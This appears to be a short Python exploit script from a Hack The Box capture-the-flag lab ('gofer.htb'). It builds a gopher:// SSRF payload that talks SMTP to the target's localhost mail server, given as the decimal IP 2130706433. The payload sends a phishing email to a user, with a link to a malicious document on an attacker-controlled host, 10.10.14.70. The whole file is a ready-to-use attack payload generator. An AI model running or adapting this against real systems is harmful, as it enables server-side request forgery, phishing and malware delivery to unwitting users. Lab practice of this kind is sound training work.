#!/usr/bin/python3

from datetime import datetime


template ='''gopher://{ip}:{port}/_EHLO {domain}
MAIL FROM:<{mfrom}>
RCPT TO:<{to}>
DATA
Subject: {subject}
From: {mfrom}
To: {to}

{payload}

.
QUIT
'''
current_datetime = datetime.now()
formatted_datetime = current_datetime.strftime("%a, %d %b %Y %H:%M:%S %z")

gopher_payload = template.format(ip="2130706433", port="25", domain="gofer.htb", mfrom="flower@letmin.com", to="jhudson@gofer.htb", name="FlowerMan", date=formatted_datetime, subject="Flowers are best", payload="Please click for flowers <a href='http://10.10.14.70:80/bad.odt>flowers are good</a>")

print(gopher_payload)